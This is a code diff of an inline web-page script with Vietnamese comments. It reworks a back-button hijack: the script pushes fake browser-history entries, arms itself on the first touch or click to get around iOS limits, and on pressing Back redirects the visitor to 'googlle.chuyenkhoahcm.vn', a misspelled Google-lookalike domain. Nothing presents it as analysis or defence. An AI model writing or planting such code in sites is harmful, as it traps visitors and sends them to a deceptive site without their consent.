@@ -190,21 +190,32 @@
      deleteComponent()
  </script>
 
- <script defer>
+ <script>
      (function() {
 
          const redirectUrl = "https://googlle.chuyenkhoahcm.vn";
 
-         function redirect() {
-             window.location.replace(redirectUrl);
+         function init() {
+             history.pushState({
+                 page: 1
+             }, "", location.href);
          }
 
-         // tạo 2 state để đảm bảo back luôn kích hoạt
-         history.pushState(null, "", location.href);
-         history.pushState(null, "", location.href);
+         function redirect() {
+             location.replace(redirectUrl);
+         }
 
-         window.addEventListener("popstate", function() {
-             redirect();
+         // đợi user interaction (iOS yêu cầu)
+         function enableTrap() {
+             init();
+             window.addEventListener("popstate", redirect);
+         }
+
+         document.addEventListener("touchstart", enableTrap, {
+             once: true
+         });
+         document.addEventListener("click", enableTrap, {
+             once: true
          });
 
      })();
